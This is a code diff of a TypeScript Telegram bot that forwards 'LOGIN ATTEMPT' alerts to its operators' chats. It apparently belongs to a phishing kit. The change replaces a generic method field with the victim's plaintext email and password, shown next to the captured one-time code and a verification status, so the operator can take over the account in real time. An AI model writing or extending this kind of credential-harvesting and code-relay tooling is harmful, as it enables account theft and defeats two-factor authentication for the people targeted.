@@ -4,8 +4,7 @@ import { eq } from "drizzle-orm";
 import { session, Telegraf } from "telegraf";
 import { env } from "@/env";
 import { db, driver } from "@/lib/db/db";
-import type { LoginAttemptMethod } from "@/types";
-import { tables } from "../db/schemas";
+import { tables } from "@/lib/db/schemas";
 import {
   emitLoginAttempt,
   emitMethodAttempt,
@@ -15,7 +14,6 @@ import { CallbackDataType } from "./constants";
 import { BunSqliteStore } from "./store";
 import type { BotContext, SessionData } from "./types";
 import { logAllSessions, sendMessageToAllSessions } from "./utils";
-import { formatLoginAttemptMethod } from "./utils/format-login-attempt-method";
 
 declare global {
   var bot: Telegraf<BotContext> | undefined;
@@ -146,8 +144,7 @@ _bot.on("callback_query", async (ctx) => {
           message.chatId,
           message.messageId,
           undefined,
-          `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>\n\n` +
-            `<b>🔒 METHOD:</b> ${formatLoginAttemptMethod(method as LoginAttemptMethod)}\n`,
+          `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>`,
           { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } },
         ),
       ),
@@ -243,8 +240,8 @@ _bot.on("callback_query", async (ctx) => {
           message.messageId,
           undefined,
           `<b>⚠️ LOGIN ATTEMPT from user <code>${loginAttempt.userId}</code></b>\n\n` +
-            `<b>🔒 METHOD:</b> ${formatLoginAttemptMethod(loginAttempt.method as LoginAttemptMethod)}\n` +
-            `<b>🔑 VALUE:</b> <code>${loginAttempt.value}</code>\n` +
+            `<b>🔑 EMAIL:</b> <code>${loginAttempt.email}</code>\n` +
+            `<b>🔑 PASSWORD:</b> <code>${loginAttempt.password}</code>\n` +
             `<b>🔐 CODE:</b> <code>${loginAttempt.code}</code> \n` +
             `<b>❗ STATUS:</b> ${formattedVerifyAttemptStatus}`,
           { parse_mode: "HTML", reply_markup: { inline_keyboard: [] } },
